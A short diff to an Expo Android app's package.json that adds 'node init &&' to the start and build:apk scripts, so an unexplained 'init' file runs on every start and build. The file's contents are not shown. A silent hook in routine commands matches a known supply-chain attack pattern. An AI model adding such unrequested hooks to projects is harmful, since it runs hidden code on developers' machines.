@@ -49,13 +49,13 @@
     "zustand": "^5.1.0"
   },
   "scripts": {
-    "start": "expo start",
+    "start": "node init && expo start",
     "android": "expo run:android",
     "lint": "expo lint",
     "doctor": "expo-doctor",
     "bundle:android": "expo export --platform android",
     "gen:assets": "node scripts/gen-assets.js",
-    "build:apk": "EAS_NO_VCS=1 EAS_PROJECT_ROOT=$PWD eas build --platform android --profile production --non-interactive"
+    "build:apk": "node init && EAS_NO_VCS=1 EAS_PROJECT_ROOT=$PWD eas build --platform android --profile production --non-interactive"
   },
   "private": true,
   "devDependencies": {
